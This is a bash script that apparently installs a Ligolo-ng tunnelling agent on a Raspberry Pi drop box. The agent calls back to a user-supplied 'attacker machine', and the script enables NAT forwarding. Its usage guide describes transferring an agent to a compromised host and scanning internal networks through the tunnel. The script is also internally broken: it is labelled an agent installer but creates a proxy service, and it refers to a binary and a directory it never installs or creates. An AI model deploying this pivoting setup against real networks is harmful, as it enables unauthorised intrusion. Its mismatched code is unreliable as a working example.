#!/bin/bash

# =================================================================================================
# RaspPunzel - Ligolo-ng Agent Installation Script
# =================================================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Load configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

if [[ -f "${PROJECT_ROOT}/config.sh" ]]; then
    source "${PROJECT_ROOT}/config.sh"
else
    echo -e "${RED}Error: config.sh not found${NC}"
    exit 1
fi

# Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    aarch64|arm64)
        LIGOLO_ARCH="arm64"
        ;;
    armv7l)
        LIGOLO_ARCH="armv7"
        ;;
    x86_64)
        LIGOLO_ARCH="amd64"
        ;;
    *)
        echo -e "${RED}Unsupported architecture: $ARCH${NC}"
        exit 1
        ;;
esac

echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}  Installing Ligolo-ng AGENT ${LIGOLO_VERSION}${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo ""

# Prompt for proxy server address if not set
if [[ -z "${LIGOLO_PROXY_HOST}" ]]; then
    echo -e "${YELLOW}[!] Proxy server address not configured${NC}"
    echo ""
    echo "Enter your ATTACKER MACHINE details:"
    read -p "Proxy Host/IP: " LIGOLO_PROXY_HOST
    read -p "Proxy Port [11601]: " LIGOLO_PROXY_PORT_INPUT
    LIGOLO_PROXY_PORT="${LIGOLO_PROXY_PORT_INPUT:-11601}"
    
    # Save to config
    echo "" >> "${PROJECT_ROOT}/config.sh"
    echo "# Ligolo Proxy Server (Your Attacker Machine)" >> "${PROJECT_ROOT}/config.sh"
    echo "LIGOLO_PROXY_HOST=\"${LIGOLO_PROXY_HOST}\"" >> "${PROJECT_ROOT}/config.sh"
    echo "LIGOLO_PROXY_PORT=\"${LIGOLO_PROXY_PORT}\"" >> "${PROJECT_ROOT}/config.sh"
fi

echo ""
echo -e "${GREEN}[+] Agent will connect to: ${LIGOLO_PROXY_HOST}:${LIGOLO_PROXY_PORT}${NC}"
echo ""

# Create directories
mkdir -p /opt/rasppunzel/ligolo
mkdir -p /etc/rasppunzel

# Download Ligolo-ng agent
cd /tmp
echo -e "${YELLOW}[~] Downloading Ligolo-ng agent...${NC}"
wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION}_linux_${LIGOLO_ARCH}.tar.gz"

# Extract
tar -xzf "ligolo-ng_agent_${LIGOLO_VERSION}_linux_${LIGOLO_ARCH}.tar.gz"

# Install
mv agent /opt/rasppunzel/ligolo/
chmod +x /opt/rasppunzel/ligolo/agent

# Save version
echo "${LIGOLO_VERSION}" > /opt/rasppunzel/ligolo/VERSION

# Cleanup
rm -f /tmp/ligolo-ng_*.tar.gz

echo -e "${GREEN}[+] Ligolo-ng agent installed${NC}"

# Create agent configuration file
echo -e "${YELLOW}[~] Creating agent configuration...${NC}"
cat > /etc/rasppunzel/agent.conf <<EOF
# Ligolo-ng Agent Configuration
# This Raspberry Pi connects to YOUR attacker machine proxy

# Proxy server address (YOUR attacker machine)
PROXY_HOST="${LIGOLO_PROXY_HOST}"
PROXY_PORT="${LIGOLO_PROXY_PORT}"

# Connection options
IGNORE_CERT="true"
RETRY_DELAY="10"
AUTO_RESTART="true"

# Logging
LOG_LEVEL="info"
EOF

echo -e "${GREEN}[+] Configuration created${NC}"

# Create systemd service for agent
echo -e "${YELLOW}[~] Creating systemd service...${NC}"
cat > /etc/systemd/system/ligolo-agent.service <<EOF
[Unit]
Description=Ligolo-ng Proxy Server
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/ligolo-ng
ExecStartPre=/bin/sh -c 'ip tuntap add user root mode tun ${TUN_INTERFACE} || true'
ExecStartPre=/bin/sh -c 'ip link set ${TUN_INTERFACE} up || true'
ExecStartPre=/bin/sh -c 'ip addr add ${TUN_IP} dev ${TUN_INTERFACE} || true'
ExecStart=/opt/ligolo-ng/proxy -selfcert -laddr ${LIGOLO_BIND_ADDR}:${LIGOLO_PORT}
ExecStopPost=/bin/sh -c 'ip link delete ${TUN_INTERFACE} || true'
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable ligolo-proxy

echo -e "${GREEN}[+] Ligolo-ng service configured${NC}"

# Configure IP forwarding
echo -e "${YELLOW}[~] Configuring IP forwarding...${NC}"
if ! grep -q "net.ipv4.ip_forward=1" /etc/sysctl.conf; then
    echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
fi
sysctl -p >/dev/null

# Configure iptables
echo -e "${YELLOW}[~] Configuring firewall rules...${NC}"

# Allow Ligolo port
iptables -A INPUT -p tcp --dport ${LIGOLO_PORT} -j ACCEPT

# Allow forwarding through Ligolo interface
iptables -A FORWARD -i ${TUN_INTERFACE} -j ACCEPT
iptables -A FORWARD -o ${TUN_INTERFACE} -j ACCEPT

# NAT for outbound traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

# Save rules
if command -v netfilter-persistent &> /dev/null; then
    netfilter-persistent save
elif command -v iptables-save &> /dev/null; then
    iptables-save > /etc/iptables/rules.v4
fi

echo -e "${GREEN}[+] Firewall rules configured${NC}"

# Create helper scripts
echo -e "${YELLOW}[~] Creating helper scripts...${NC}"

cat > /usr/local/bin/ligolo-status <<'EOF'
#!/bin/bash
echo "=== Ligolo-ng Status ==="
systemctl status ligolo-proxy --no-pager
echo ""
echo "=== TUN Interface ==="
ip addr show ligolo 2>/dev/null || echo "Interface not created"
echo ""
echo "=== Active Connections ==="
ss -tulpn | grep :11601
EOF
chmod +x /usr/local/bin/ligolo-status

cat > /usr/local/bin/ligolo-restart <<'EOF'
#!/bin/bash
echo "Restarting Ligolo-ng proxy..."
systemctl restart ligolo-proxy
sleep 2
systemctl status ligolo-proxy --no-pager
EOF
chmod +x /usr/local/bin/ligolo-restart

echo -e "${GREEN}[+] Helper scripts created${NC}"

# Create documentation
cat > /opt/ligolo-ng/USAGE.txt <<EOF
=================================================================================
Ligolo-ng Quick Reference
=================================================================================

PROXY INFORMATION:
  Location: /opt/ligolo-ng/proxy
  Service: systemctl status ligolo-proxy
  Port: ${LIGOLO_PORT}
  TUN Interface: ${TUN_INTERFACE}
  TUN IP: ${TUN_IP}

QUICK COMMANDS:
  Status: ligolo-status
  Restart: ligolo-restart
  Logs: journalctl -u ligolo-proxy -f

DEPLOYING AGENT:
  1. Download agent for target OS from:
     https://github.com/nicocha30/ligolo-ng/releases

  2. Transfer to compromised host

  3. Run agent:
     ./agent -connect <RASPPUNZEL_IP>:${LIGOLO_PORT} -ignore-cert

CONFIGURING ROUTES (on your attacker machine):
  # Add route to internal network
  sudo ip route add 172.16.10.0/24 dev ${TUN_INTERFACE}

  # Verify route
  ip route show | grep ${TUN_INTERFACE}

  # Remove route
  sudo ip route del 172.16.10.0/24 dev ${TUN_INTERFACE}

ACCESSING INTERNAL NETWORKS:
  Once agent connected and route configured, access directly:
  - ping 172.16.10.50
  - nmap 172.16.10.0/24
  - curl http://172.16.10.100

NO SOCKS PROXY NEEDED!

=================================================================================
EOF

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════"
echo "  Ligolo-ng Installation Complete!"
echo "═══════════════════════════════════════════════════════════"
echo -e "${NC}"
echo "  Proxy: /opt/ligolo-ng/proxy"
echo "  Service: ligolo-proxy"
echo "  Port: ${LIGOLO_PORT}"
echo "  TUN Interface: ${TUN_INTERFACE}"
echo ""
echo "  Usage guide: cat /opt/ligolo-ng/USAGE.txt"
echo "  Status: ligolo-status"
echo ""
echo -e "${YELLOW}  Start service: systemctl start ligolo-proxy${NC}"
echo ""